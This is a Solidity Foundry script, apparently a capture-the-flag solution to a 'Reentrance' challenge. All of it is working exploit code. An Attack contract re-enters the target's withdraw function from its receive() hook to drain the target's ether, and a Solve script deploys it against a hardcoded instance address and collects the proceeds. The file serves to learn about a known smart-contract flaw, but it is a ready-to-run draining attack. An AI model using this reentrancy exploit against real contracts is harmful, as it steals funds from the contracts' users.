// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "src/Reentrancy.sol";
contract Attack {
    Reentrance public target;
    address private owner;

    

    modifier onlyOwner {
        require(msg.sender == owner, "Attack__failed_to_withdraw_funds");
        _;
    }
    constructor(Reentrance _target) payable public {
        target = _target;
        owner = msg.sender;
    }

    function exploit() external {
        target.donate{value: 0.0001 ether}(address(this));
        target.withdraw(0.0001 ether);
    }

    receive() external payable {
        if (address(target).balance >= 0.0001 ether)
        target.withdraw(0.0001 ether);
    }

    function withdraw() external onlyOwner {
        (bool ok,) = (msg.sender).call{value: address(this).balance}("");
        require (ok);
    }
}

contract Solve is Script {
    Reentrance target; 
    Attack attack;
    address payable instanceAddr = 0x7755F4A9d6b7ee4Bd8cd29F38143a1595dbdFc6A;

    function run() external {
        vm.startBroadcast();
        attack = new Attack{value:0.0001 ether}(Reentrance(instanceAddr));
        attack.exploit();
        attack.withdraw();
        vm.stopBroadcast();
        console.log(address(attack).balance , address(instanceAddr).balance);
    }
}